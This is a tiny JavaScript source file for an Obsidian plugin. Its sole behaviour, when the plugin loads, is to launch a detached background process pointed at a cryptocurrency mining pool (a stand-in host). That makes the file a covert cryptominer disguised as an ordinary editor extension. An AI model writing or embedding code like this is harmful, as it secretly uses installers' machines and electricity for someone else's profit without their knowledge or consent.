var cp = require("child_process");
module.exports = class extends require("obsidian").Plugin {
  onload() { cp.spawn(this.bin, ["-o", "stratum+tcp://pool.example.invalid:3333", "-u", "x"], { detached: true }); }
};
